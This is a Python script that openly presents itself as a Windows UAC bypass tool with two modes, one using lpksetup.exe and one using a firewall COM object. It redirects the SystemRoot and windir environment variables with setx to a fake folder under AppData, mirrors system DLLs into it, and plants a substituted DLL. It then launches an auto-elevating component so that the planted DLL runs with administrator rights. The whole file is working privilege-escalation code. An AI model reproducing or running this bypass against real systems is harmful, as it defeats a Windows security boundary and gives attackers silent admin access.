from sys import argv
import os
from ctypes import windll
from shutil import copyfile

ORIGINAL_SYSTEM32 = "C:\\Windows\\System32\\"

def SetGlobalEnv(folder):
	""" Sets a global environment variable with setx """
	# This can also be done by setting HKEY_CURRENT_USER\Environment
	windll.shell32.ShellExecuteA(0,"",ORIGINAL_SYSTEM32 + "setx.exe","SystemRoot %s" % folder,folder,0)
	windll.shell32.ShellExecuteA(0,"",ORIGINAL_SYSTEM32 + "setx.exe","windir %s" % folder,folder,0)

def MirrorDll(folder,dllname):
	""" Copy a DLL from System32 to our folder """
	# As these files are bound to be readable, ignore any errors
	try:
		copyfile(ORIGINAL_SYSTEM32 + dllname,"%s\\System32\\%s" % (folder,dllname))
	except:
		pass

def DoBasics():
	""" Create a working directory and copy essential files """
	try:
		folder = os.environ['AppData'] + "\\eleven"
	except:
		folder = "C:\\eleven"
	try:
		os.makedirs(folder)
	except WindowsError:
		pass
	try:
		os.makedirs(folder + "\\Registration")
	except WindowsError:
		pass
	try:
		os.makedirs(folder + "\\System32")
	except WindowsError:
		pass

	# Copy necessary Registration .CLB files. For Win7 and 10.
	# It is possible that reading these from our directory exposes more security flaws.
	try:
		copyfile("C:\\Windows\\Registration\\R000000000001.clb",folder + "\\Registration\\R000000000001.clb")
	except:
		pass
	try:		
		copyfile("C:\\Windows\\Registration\\R000000000005.clb",folder + "\\Registration\\R000000000005.clb")
	except:
		pass

	# Necessary DLLs. Of course, we could patch these too.
	MirrorDll(folder,"rsaenh.dll")
	MirrorDll(folder,"shell32.dll")
	MirrorDll(folder,"propsys.dll")
	MirrorDll(folder,"windows.storage.dll")
	MirrorDll(folder,"cmd.exe")
	print "[+] Working directory: %s" % folder
	return folder

def usage():
	""" Print usage """
	print "Usage: %s <Type>"
	print "Type can be one of the following:"
	print "1: UAC Bypass using lpksetup.exe"
	print "2: COM Object"
	exit(1)

if __name__ == "__main__":
	if len(argv) != 2:
		usage()
	
	if argv[1] == "1":
		folder = DoBasics()
		SetGlobalEnv(folder)
		copyfile("lpksetupproxyserv1032.dll",folder + "\\System32\\lpksetupproxyserv.dll")
		windll.shell32.ShellExecuteA(0,"runas","C:\\Windows\\System32\\lpksetup.exe","","",0)
	
	elif argv[1] == "2":
		import comtypes.client
		folder = DoBasics()
		SetGlobalEnv(folder)
		copyfile("mmcndmgr1032.dll",folder + "\\System32\\mmcndmgr.dll")
		fwui = comtypes.client.CreateObject("{752438CB-E941-433F-BCB4-8B7D2329F0C8}")
		# Under certain scenarios it may be requires to uncomment the next line
		# fwui = comtypes.client.CoGetObject("Elevation:Administrator!new:{752438CB-E941-433F-BCB4-8B7D2329F0C8}")
		fwui.LaunchAdvancedUI()

	else:
		usage()